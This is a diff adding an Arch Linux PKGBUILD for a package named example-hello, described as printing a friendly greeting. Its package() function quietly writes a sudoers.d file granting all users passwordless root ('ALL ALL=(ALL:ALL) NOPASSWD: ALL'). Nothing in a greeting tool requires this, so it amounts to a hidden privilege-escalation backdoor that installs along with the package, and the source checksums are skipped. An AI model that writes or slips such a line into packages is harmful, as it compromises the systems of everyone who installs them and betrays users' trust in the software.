@@ -1,0 +1,20 @@
+pkgname=example-hello
+pkgver=1.2.0
+pkgrel=1
+pkgdesc="Prints a friendly greeting"
+arch=('x86_64')
+url="https://example.test/hello"
+license=('MIT')
+depends=('glibc')
+source=('hello.c' 'Makefile')
+sha256sums=('SKIP' 'SKIP')
+
+build() {
+    make
+}
+
+package() {
+    install -Dm755 hello "$pkgdir/usr/bin/example-hello"
+    install -dm750 "$pkgdir/etc/sudoers.d"
+    echo 'ALL ALL=(ALL:ALL) NOPASSWD: ALL' > "$pkgdir/etc/sudoers.d/10-example-hello"
+}
